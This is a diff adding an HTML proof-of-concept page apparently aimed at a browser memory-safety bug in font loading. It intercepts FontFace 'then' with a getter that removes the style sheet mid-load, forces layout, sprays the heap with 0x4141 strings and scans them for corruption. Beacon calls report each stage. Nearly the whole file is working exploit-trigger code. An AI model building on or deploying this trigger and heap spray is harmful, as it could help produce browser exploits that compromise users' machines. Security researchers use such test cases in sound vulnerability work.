@@ -1,0 +1,53 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>css</title>
+<style id="victim-style">
+@font-face { font-family: xx; src: local("Helvetica"); unicode-range: U+0041; }
+.test { font-family: xx, monospace; }
+</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+b('CS-PARSE');
+window.__spray = [];
+(function(){
+var SPRAY = (location.hash.indexOf('nospray') >= 0) ? 0 : 2000;
+function run(){
+  b('CS-START-spray' + SPRAY);
+  document.body.innerHTML = '<p class="test">A</p>';
+  var proto = FontFace.prototype;
+  var desc = Object.getOwnPropertyDescriptor(proto, 'then');
+  if (!desc) {
+    Object.defineProperty(proto, 'then', {
+      get: function(){
+        b('CS-GETTER-ENTER');
+        try { document.getElementById('victim-style').remove(); b('CS-STYLE-REMOVED'); }
+        catch(e) { b('CS-RMERR'); }
+        try { document.body.offsetHeight; } catch(e) {}
+        b('CS-LAYOUT-DONE');
+        for (var i = 0; i < SPRAY; i++) {
+          var arr = new Array(128).fill("\u4141");
+          window.__spray.push(arr.join(""));
+        }
+        b('CS-SPRAYED-' + window.__spray.length);
+        try { b('CS-CHECK-' + document.fonts.check('1em xx')); } catch(e) { b('CS-CHECK-ERR'); }
+        b('CS-GETTER-RETURN');
+        return undefined;
+      },
+      set: function(v){}
+    });
+  }
+  document.fonts.load('1em xx', 'A').then(
+    function(){ b('CS-RESOLVED'); },
+    function(){ b('CS-REJECTED'); }
+  );
+  b('CS-LOAD-CALLED');
+  setTimeout(function(){ b('CS-T1500'); }, 1500);
+  setTimeout(function(){
+    var v = window.__spray[0] || "", diffs = 0;
+    for (var i = 0; i < v.length; i++) { if (v.charCodeAt(i) !== 0x4141) diffs++; }
+    b('CS-SCAN-len' + v.length + '-diffs' + diffs);
+    b('CS-DONE');
+  }, 2500);
+}
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+})();
+</script></head><body><p class="test">A</p></body></html>
